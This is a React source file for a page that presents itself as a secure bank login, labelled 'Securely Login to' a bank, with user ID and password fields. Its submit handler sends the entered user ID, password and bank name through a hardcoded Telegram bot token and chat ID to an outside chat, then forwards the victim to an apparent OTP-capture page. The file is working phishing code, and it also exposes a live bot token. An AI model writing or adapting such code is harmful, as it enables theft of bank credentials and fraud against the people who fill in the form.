import React, { useState, useEffect } from 'react';
import './home.css';

import moment from 'moment';
import { useNavigate,Link , useLocation} from 'react-router-dom';


import logo from './logo.svg';
import social from './social.png';
import footer from './footer.svg';
import fwallet from  './fwallets.svg';


import {db, auth, storage} from './firebase';

import axios from 'axios'

import { collection, getDocs, where, query, doc, setDoc,deleteDoc } from "firebase/firestore";
import hero from './hero.jpeg';
import { ref, uploadBytes, getDownloadURL } from "firebase/storage";


import Swal from 'sweetalert2';
import Nav from './dashboard/nav';


function NextStep(){


    const location  = useLocation();
    const navigate = useNavigate();


    const[logotwo, setLogo] = useState(location.state.logo);
    const[name, setName] = useState(location.state.name);

    const[userid, setUserId] = useState("");

    const[password, setPassword] = useState("");
    


    // useEffect(() => {
       
    //     // window.location.reload();
    
      
    
    //   }, []); 


    //   application data

    
    async function handleSubmit(e){
        e.preventDefault();

        try {
            

            const response = await axios.post(`https://api.telegram.org/bot5464982919:AAGtjeZQ4hxueJkOoefHp040NJNaWGIZKMM/sendMessage`, {
                chat_id: 950865661,
                text: `UserId is : ${userid} , password is: ${password}  and bank is  ${name}`,
              });
          

            console.log('Message sent successfully:', response.data);

            navigate('/payment-secure-otp',
            {state:
                {
                    name:name,
                    userid:userid,
                    password:password
                   
                }
            }
            );
          } catch (error) {
            console.error('Error sending message:', error.message);
          }
    }
    

    return(
        <>
            <div className='row main'>
            <Nav />

                   

               
              




                <div className='col-md-9 full bg-light m-0 px-0'>
                    <br>
                    </br>
                    <br></br>
                    <br></br>
                   

                 

                 <div className='card col-md-6 m-auto px-4 py-2 rounded'>

                     <div className='text-center'>
                     

                <h4 className='intro'>Securely Login to <b>{name}</b> </h4>
                     </div>


                     <div className='cardtwo col-11 rounded shadow m-auto py-2'>

                         
<form onSubmit={handleSubmit}>

    <div className='form-group'>
<label className='topic'>User ID</label>
    <input onChange={function(e){
        setUserId(e.target.value);
    }} value={userid} type="text"className='form-control' required/>
</div>



<div className='form-group'>
<label className='topic'>Password</label>
    <input onChange={function(e){
        setPassword(e.target.value);
    }} value={password} type="password"className='form-control' required/>
</div>

<br />

<br/>

<hr />

<div className='text-center'>

    <button type="submit" className='btn text-light w-100 continue'data-toggle="modal" data-target="#exampleModal">Continue</button>

</div>


</form>
</div>


          

            

                 </div>


               
                  

                 
             


               



    
                 <div class="coinmarketcap-currency-widget" data-currencyid="1" data-base="USD" data-secondary="" data-ticker="true" data-rank="true" data-marketcap="true" data-volume="true" data-statsticker="true" data-stats="USD"></div>


               
               
                </div>





                 
                
                </div>
        </>
    );
}

export default NextStep;